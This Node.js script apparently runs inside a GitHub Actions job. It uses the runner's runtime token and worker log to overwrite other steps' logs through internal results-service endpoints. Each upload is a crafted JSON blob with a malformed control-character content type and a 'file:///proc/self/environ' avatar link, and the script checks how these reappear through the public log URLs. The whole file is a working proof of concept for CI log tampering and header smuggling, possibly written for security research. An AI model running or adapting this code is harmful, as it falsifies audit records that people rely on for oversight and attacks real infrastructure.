import {createHash} from 'node:crypto';
import fs from 'node:fs';
import {execSync} from 'node:child_process';
import http from 'node:http';
import https from 'node:https';
import tls from 'node:tls';
import {BlobClient} from '@azure/storage-blob';
import {getResultsServiceUrl} from '../node_modules/@actions/artifact/lib/internal/shared/config.js';

const odd = '\u0085application/json';
const repo = process.env.GITHUB_REPOSITORY;
const token = process.env.GITHUB_TOKEN;
const runId = process.env.GITHUB_RUN_ID;
const rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
const claims = JSON.parse(Buffer.from(rt.split('.')[1], 'base64url').toString());
const m = new RegExp('Actions\\.Results:([^: ]+):([^ ]+)').exec(claims.scp || '');
const runBackend = m ? m[1] : null;
const jobBackend = m ? m[2] : null;

function req(url, method = 'GET', body = null, headers = {}) {
  return new Promise((resolve, reject) => {
    const t = new URL(url);
    const mod = t.protocol === 'https:' ? https : http;
    const r = mod.request(t, {method, headers, timeout: 25000}, (res) => {
      const c = [];
      res.on('data', (x) => c.push(x));
      res.on('end', () => resolve({status: res.statusCode, headers: res.headers, rawHeaders: res.rawHeaders, body: Buffer.concat(c)}));
    });
    r.on('error', reject);
    r.on('timeout', () => r.destroy(new Error('timeout')));
    if (body) r.write(body);
    r.end();
  });
}

// raw TLS GET that preserves the exact header bytes
function rawGet(url, headers = {}) {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const socket = tls.connect({host: u.hostname, port: Number(u.port || 443), servername: u.hostname, ALPNProtocols: ['http/1.1']});
    socket.setTimeout(25000);
    const chunks = [];
    let sent = false;
    socket.once('secureConnect', () => {
      const path = u.pathname + u.search;
      let h = `GET ${path} HTTP/1.1\r\nHost: ${u.host}\r\n`;
      for (const [k, v] of Object.entries(headers)) h += `${k}: ${v}\r\n`;
      h += 'Connection: close\r\n\r\n';
      socket.write(h);
      sent = true;
    });
    socket.on('data', (c) => chunks.push(c));
    socket.once('error', reject);
    socket.once('timeout', () => socket.destroy(new Error('tls timeout')));
    socket.once('end', () => resolve(Buffer.concat(chunks)));
    socket.once('close', () => { if (!sent && chunks.length === 0) resolve(Buffer.concat(chunks)); });
  });
}

function parseRawResponse(raw) {
  const idx = raw.indexOf('\r\n\r\n');
  if (idx < 0) return {head: raw, body: Buffer.alloc(0), status: null, contentTypes: [], rawHeaders: []};
  const headBuf = raw.subarray(0, idx);
  let body = raw.subarray(idx + 4);
  const headText = headBuf.toString('latin1');
  const lines = headText.split('\r\n');
  const status = Number((lines[0] || '').split(' ')[1]);
  const rawHeaders = [];
  let contentTypes = [];
  let chunked = false;
  for (const line of lines.slice(1)) {
    const p = line.indexOf(':');
    if (p < 0) continue;
    const name = line.slice(0, p);
    const value = line.slice(p + 1).replace(/^ /, '');
    rawHeaders.push([name, Buffer.from(value, 'latin1').toString('hex')]);
    if (name.toLowerCase() === 'content-type') contentTypes.push(Buffer.from(value, 'latin1').toString('hex'));
    if (name.toLowerCase() === 'transfer-encoding' && /chunked/i.test(value)) chunked = true;
  }
  if (chunked) {
    const out = [];
    let off = 0;
    while (off < body.length) {
      const le = body.indexOf('\r\n', off);
      if (le < 0) break;
      const sz = parseInt(body.subarray(off, le).toString('ascii').split(';')[0], 16);
      if (!Number.isFinite(sz) || sz === 0) break;
      out.push(body.subarray(le + 2, le + 2 + sz));
      off = le + 2 + sz + 2;
    }
    body = Buffer.concat(out);
  }
  return {head: headBuf, body, status, contentTypes, rawHeaders};
}

const base = getResultsServiceUrl();
async function twirp(method, payload) {
  const url = new URL(`/twirp/results.services.receiver.Receiver/${method}`, base).href;
  const r = await req(url, 'POST', Buffer.from(JSON.stringify(payload)), {
    Authorization: `Bearer ${rt}`, 'Content-Type': 'application/json', Accept: 'application/json',
  });
  let j = null;
  try { j = JSON.parse(r.body.toString()); } catch {}
  return {status: r.status, body: j, raw: r.body.toString().slice(0, 400)};
}

async function upload(url, bytes) {
  const b = new BlobClient(url).getBlockBlobClient();
  await b.uploadData(bytes, {blobHTTPHeaders: {blobContentType: odd}});
}

const sha = (b) => createHash('sha256').update(b).digest('hex');

// Find worker log and parse job message
let workerLog = null;
try {
  workerLog = execSync("find /home/runner/actions-runner -name 'Worker_*.log' -mmin -30 2>/dev/null | head -1", {encoding: 'utf8'}).trim();
} catch {}
let steps = [];
if (workerLog) {
  const text = fs.readFileSync(workerLog, 'utf8');
  const idx = text.indexOf('Job message:');
  if (idx >= 0) {
    const start = text.indexOf('{', idx);
    let depth = 0, inStr = false, esc = false, end = -1;
    for (let i = start; i < text.length; i++) {
      const c = text[i];
      if (inStr) { if (esc) esc = false; else if (c === '\\') esc = true; else if (c === '"') inStr = false; continue; }
      if (c === '"') { inStr = true; continue; }
      if (c === '{') depth++;
      else if (c === '}') { depth--; if (depth === 0) { end = i + 1; break; } }
    }
    if (end > start) {
      try {
        const msg = JSON.parse(text.slice(start, end));
        const rawSteps = msg.steps || msg.Steps || [];
        steps = rawSteps.map((s) => ({id: s.id || s.Id, display: s.displayName || s.DisplayName, ref: s.reference?.name || s.Reference?.Name}));
      } catch {}
    }
  }
}

// Public job listing
let publicJob = null;
try {
  const r = await req(`https://api.github.com/repos/${repo}/actions/runs/${runId}/jobs?per_page=100`, 'GET', null,
    {Authorization: `Bearer ${token}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'steplog3'});
  const j = JSON.parse(r.body.toString());
  publicJob = (j.jobs || []).find((x) => x.name === process.env.GITHUB_JOB) || (j.jobs || [])[0];
  // refresh to get steps list
  const r2 = await req(`https://api.github.com/repos/${repo}/actions/jobs/${publicJob.id}`, 'GET', null,
    {Authorization: `Bearer ${token}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'steplog3'});
  const j2 = JSON.parse(r2.body.toString());
  publicJob.steps = j2.steps || publicJob.steps || [];
} catch (e) {
  console.log('STEPLOG3-ERR', JSON.stringify({where: 'jobs', err: String(e).slice(0, 200)}));
}

const publicSteps = (publicJob?.steps || []).map((s) => ({number: s.number, name: s.name, status: s.status, conclusion: s.conclusion}));
const actionSteps = publicSteps.filter((s) => !/^Set up job$/.test(s.name) && !/^Post /.test(s.name) && !/^Complete job$/.test(s.name));
const chosen = [];
for (let i = 0; i < steps.length && i < actionSteps.length; i++) {
  const s = actionSteps[i];
  if (s.name.includes('steplog3')) continue; // keep our own log intact
  chosen.push({number: s.number, name: s.name, id: steps[i].id});
}

console.log('STEPLOG3-BASE', JSON.stringify({runBackend, jobBackend, jobId: publicJob?.id, publicSteps, msgSteps: steps.map((s) => s.id), chosen: chosen.slice(0, 6)}));

const results = [];
for (const c of chosen.slice(0, 4)) {
  const rec = {number: c.number, name: c.name, id: c.id};
  const body = Buffer.from(JSON.stringify({
    full_name: `${repo}/actions/jobs/${publicJob?.id}/steps/${c.number}/logs`,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'steplog3', stargazers_count: 0,
  }));
  rec.sha = sha(body);
  try {
    const g = await twirp('GetStepLogsSignedBlobURL', {
      workflow_run_backend_id: runBackend, workflow_job_run_backend_id: jobBackend, step_backend_id: c.id,
    });
    rec.getStatus = g.status;
    const gb = g.body || {};
    const url = gb.logs_url || gb.logsUrl || gb.signed_url;
    rec.blobStorageType = gb.blob_storage_type || gb.blobStorageType;
    rec.uploadUrlKeys = url ? [...new URL(url).searchParams.keys()].sort() : null;
    rec.uploadHasRsct = url ? new URL(url).searchParams.has('rsct') : null;
    rec.uploadHost = url ? new URL(url).host : null;
    if (url) {
      await upload(url, body);
      rec.upload = 'ok';
    }
    const meta = await twirp('CreateStepLogsMetadata', {
      workflow_run_backend_id: runBackend, workflow_job_run_backend_id: jobBackend,
      step_backend_id: c.id, uploaded_at: new Date().toISOString(), line_count: 1,
    });
    rec.meta = meta.status;
    rec.metaOk = !!(meta.body && meta.body.ok);
    if (!rec.metaOk) rec.metaRaw = meta.raw;

    let loc = null;
    for (let attempt = 0; attempt < 6; attempt++) {
      const r1 = await req(`https://api.github.com/repos/${repo}/actions/jobs/${publicJob.id}/steps/${c.number}/logs`, 'GET', null,
        {Authorization: `Bearer ${token}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'steplog3'});
      rec.publicStatus = r1.status;
      rec.publicCtHex = r1.headers['content-type'] ? Buffer.from(r1.headers['content-type'], 'latin1').toString('hex') : null;
      loc = r1.headers.location || null;
      if (loc) break;
      rec.publicBody = r1.body.toString().slice(0, 200);
      await new Promise((res) => setTimeout(res, 500));
    }
    if (loc) {
      const u = new URL(loc);
      rec.locHost = u.host;
      rec.locPath = u.pathname.slice(0, 120);
      rec.locKeys = [...u.searchParams.keys()].sort();
      const rawParam = u.search.match(/[?&]rsct=([^&]*)/);
      rec.locRsctRaw = rawParam ? rawParam[1] : null;
      rec.locRsctRawHex = rawParam ? Buffer.from(rawParam[1], 'latin1').toString('hex') : null;
      rec.locRsctDecoded = u.searchParams.get('rsct');
      rec.locRsctDecodedHex = rec.locRsctDecoded == null ? null : Buffer.from(rec.locRsctDecoded, 'latin1').toString('hex');
      try {
        const raw = await rawGet(loc, {'User-Agent': 'steplog3-raw'});
        const parsed = parseRawResponse(raw);
        rec.finalStatus = parsed.status;
        rec.finalCtHex = parsed.contentTypes;
        rec.finalHeadKinds = parsed.rawHeaders.filter(([n]) => /content-type|content-disposition|content-encoding/i.test(n));
        rec.finalBodySha = sha(parsed.body);
        rec.finalBodyMatch = parsed.body.equals(body);
        rec.finalBodyHead = parsed.body.subarray(0, 80).toString('latin1');
      } catch (e) {
        rec.rawErr = String(e).slice(0, 200);
      }
      // also follow with node https (cross-check decoded header string)
      try {
        const r2 = await req(loc);
        rec.nodeFinalStatus = r2.status;
        rec.nodeCtJson = JSON.stringify(r2.headers['content-type']);
        rec.nodeCtHex = r2.headers['content-type'] ? Buffer.from(r2.headers['content-type'], 'latin1').toString('hex') : null;
      } catch (e) { rec.nodeErr = String(e).slice(0, 120); }
    }
  } catch (e) {
    rec.err = String(e).slice(0, 250);
  }
  results.push(rec);
}
console.log('STEPLOG3', JSON.stringify({results}));
